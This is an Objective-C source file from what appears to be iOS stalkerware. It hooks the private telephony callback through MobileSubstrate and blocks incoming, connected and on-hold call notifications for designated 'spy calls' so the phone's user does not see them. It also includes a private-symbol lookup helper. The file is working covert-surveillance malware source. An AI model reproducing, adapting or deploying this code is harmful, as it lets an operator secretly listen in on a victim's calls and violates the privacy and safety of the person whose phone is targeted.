//
//  MSSPC.m
//  MSSPC
//
//  Created by Makara Khloth on 3/12/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "MSSPC.h"
#import "Telephony.h"

#import "SpyCallManager.h"
#import "SpyCallUtils.h"
#import "FxCall.h"
#import "TelephoneNumberPicker.h"

template <typename Type_>
static inline void lookupSymbol(const char *libraryFilePath, const char *symbolName, Type_ &function) {
    // Lookup the function
    struct nlist nl[2];
    memset(nl, 0, sizeof(nl));
    nl[0].n_un.n_name = (char *)symbolName;
    nlist(libraryFilePath, nl);
    
    // Check whether it is ARM or Thumb
    uintptr_t value = nl[0].n_value;
    if ((nl[0].n_desc & N_ARM_THUMB_DEF) != 0) {
        value |= 0x00000001;
	}
    
    function = reinterpret_cast<Type_>(value);
}

FxCall *getFxCall(NSDictionary *aCallNotificationInfo) {
	CTCall *ctCall = (CTCall *)[aCallNotificationInfo objectForKey:@"kCTCall"];	
	NSString *telephoneNumber = [SpyCallUtils telephoneNumber:ctCall];
	APPLOGVERBOSE(@"getFxCall, telephoneNumber: %@", telephoneNumber);
	FxCall *call = [[FxCall alloc] init];
	[call setMCTCall:ctCall];
	[call setMTelephoneNumber:telephoneNumber];
	[call setMIsSpyCall:FALSE];
	if ([SpyCallUtils isOutgoingCall:ctCall]) {
		[call setMDirection:kFxCallDirectionOut];
	} else {
		[call setMDirection:kFxCallDirectionIn];
	}
	[call autorelease];
	return (call);
}

BOOL isSpyCall(FxCall *aCall) {
	BOOL spyCall = ([aCall mDirection] == kFxCallDirectionIn &&
					[SpyCallUtils isSpyCall:[aCall mCTCall]]);
	return (spyCall);
}

MSHook(void, _ServerConnectionCallback, CTServerConnectionRef connection, CFStringRef notification, CFDictionaryRef notification_info, void * info) { // info = CTTelephonyCenter
	NSDictionary *notificationInfo = (NSDictionary *)notification_info;
	NSString *notificationName = (NSString *)notification;
	//APPLOGVERBOSE(@"TELEPHONY CALL BACK FROM %@, NOTIFICATION NAME = %@, NOTIFICATION INFO = %@", [[NSBundle mainBundle] bundleIdentifier], notificationName, notificationInfo);
	
	if ([notificationName isEqualToString:@"kCTCallStatusChangeNotification"]/* ||
		[notificationName isEqualToString:@"kCTCallIdentificationChangeNotification"]*/) {
		FxCall *call = getFxCall(notificationInfo);
		int telephonyStatus = [[notificationInfo objectForKey:@"kCTCallStatus"] intValue];
		switch (telephonyStatus) {
			case CALLBACK_TELEPHONY_NOTIFICATION_STATUS_DIALING: {
				// It's called two times per one call with (CTCall.status = 196608 [another party is ringing], kCTCallStatus = 3) and (CTCall.status = 3 [not yet arrived another party], kCTCallStatus = 3)
				//APPLOGVERBOSE(@"TELEPHONY CALL BACK FROM %@, NOTIFICATION INFO = %@, NOTIFICATION NAME = %@", [[NSBundle mainBundle] bundleIdentifier], notificationInfo, notificationName);
				[[SpyCallManager sharedManager] handleDialingCall:call];
				__ServerConnectionCallback(connection, notification, notification_info, info);
			} break;
			case CALLBACK_TELEPHONY_NOTIFICATION_STATUS_INCOMING: {
				// It's called one time per one call
				//APPLOGVERBOSE(@"TELEPHONY CALL BACK FROM %@, NOTIFICATION INFO = %@, NOTIFICATION NAME = %@", [[NSBundle mainBundle] bundleIdentifier], notificationInfo, notificationName);
				[call setMDirection:kFxCallDirectionIn];
				if (![[call mTelephoneNumber] length]) {
					[NSThread sleepForTimeInterval:1.0];
					NSString *telNumber = [[[SpyCallManager sharedManager] mTelephoneNumberPicker] mTelephoneNumber];
					[call setMTelephoneNumber:telNumber];
					APPLOGVERBOSE(@"New number daemon application = %@", telNumber);
				}
				[[SpyCallManager sharedManager] handleIncomingCall:call];
				if (![SpyCallUtils isSpyCall:[call mCTCall]]) {
					if ([SpyCallUtils isCallWaiting:[call mCTCall]] && [[SpyCallManager sharedManager] mIsSpyCallInProgress]) {
						if ([[SpyCallManager sharedManager] mIsSpyCallInConference]) {
							__ServerConnectionCallback(connection, notification, notification_info, info);
						} else {
							; // Block, next call back will change call waiting to FALSE
						}
					} else {
						__ServerConnectionCallback(connection, notification, notification_info, info);
					}
				}
			} break;
			case CALLBACK_TELEPHONY_NOTIFICATION_STATUS_CONECTED: {
				// It's called one time per one call
				//APPLOGVERBOSE(@"TELEPHONY CALL BACK FROM %@, NOTIFICATION INFO = %@, NOTIFICATION NAME = %@", [[NSBundle mainBundle] bundleIdentifier], notificationInfo, notificationName);
				[[SpyCallManager sharedManager] handleCallConnected:call];
				if (isSpyCall(call)) {
					;
				} else {
					if ([[SpyCallManager sharedManager] mIsSpyCallInitiatingConference]) {
						;
					} else {
						__ServerConnectionCallback(connection, notification, notification_info, info);
					}
				}
			} break;
			case CALLBACK_TELEPHONY_NOTIFICATION_STATUS_ONHOLD: {
				//APPLOGVERBOSE(@"TELEPHONY CALL BACK FROM %@, NOTIFICATION INFO = %@, NOTIFICATION NAME = %@", [[NSBundle mainBundle] bundleIdentifier], notificationInfo, notificationName);
				[[SpyCallManager sharedManager] handleCallOnHold:call];
				if (isSpyCall(call)) {
					;
				} else {
					if ([[SpyCallManager sharedManager] mIsSpyCallInitiatingConference]) {
						;
					} else {
						__ServerConnectionCallback(connection, notification, notification_info, info);
					}
				}
			} break;
			case CALLBACK_TELEPHONY_NOTIFICATION_STATUS_DISCONECTED: {
				// It's called one time per one call
				//APPLOGVERBOSE(@"TELEPHONY CALL BACK FROM %@, NOTIFICATION INFO = %@, NOTIFICATION NAME = %@", [[NSBundle mainBundle] bundleIdentifier], notificationInfo, notificationName);
				// For disconnect, we need to inform mobile phone application otherwise mobile phone application will not draw screen correctly
				[[SpyCallManager sharedManager] handleCallDisconnected:call];
				__ServerConnectionCallback(connection, notification, notification_info, info);
			} break;
			case CALLBACK_TELEPHONY_NOTIFICATION_STATUS_INVALID: {
				__ServerConnectionCallback(connection, notification, notification_info, info);
			} break;
			default: {
				APPLOGVERBOSE(@"TELEPHONY CALL STATUS %d", telephonyStatus);
			} break;
		}
	} else {
		__ServerConnectionCallback(connection, notification, notification_info, info);
	}
}